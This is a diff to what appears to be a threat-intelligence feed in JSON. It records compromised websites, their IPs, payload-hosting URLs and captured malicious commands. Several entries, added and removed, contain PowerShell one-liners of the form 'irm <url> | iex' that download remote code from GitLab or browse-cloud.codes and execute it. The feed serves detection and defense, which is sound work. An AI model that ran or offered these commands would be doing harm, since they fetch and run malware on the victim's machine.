@@ -1,5 +1,65 @@
 [
   {
+    "UrlDomain": "mikinkaesamulis.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "191.6.210.84"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
+    ],
+    "ReportId": "cmwnt6b7q1xan0omlwi7e71xm",
+    "ScannedAt": "2026-11-19T17:12:50.058000+00:00"
+  },
+  {
+    "UrlDomain": "seolocalpro.es",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "212.227.255.16"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
+    ],
+    "ReportId": "cmwnt3ci91x980omlku572i93",
+    "ScannedAt": "2026-11-19T17:10:31.749000+00:00"
+  },
+  {
+    "UrlDomain": "oranjeverenigingenter.nl",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "146.190.27.85"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
+    ],
+    "ReportId": "cmwnt2anm1x7q0omlytin6ijo",
+    "ScannedAt": "2026-11-19T17:09:42.708000+00:00"
+  },
+  {
     "UrlDomain": "nucleus.ltd",
     "DeliveryUrl": [
       "img-codes-cloude.info",
@@ -11514,31 +11574,5 @@
     ],
     "ReportId": "cmwdu79y204vg0omlk6z3bhq8",
     "ScannedAt": "2026-11-12T17:43:52.883000+00:00"
-  },
-  {
-    "UrlDomain": "achupallasfarms.co",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "188.114.97.0"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/874cc01bf111137b",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/874cc01bf111137b'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/874cc01bf111137b"
-    ],
-    "ReportId": "cmwdt7rly04sw0oml797g7obw",
-    "ScannedAt": "2026-11-12T17:16:16.187000+00:00"
   }
 ]
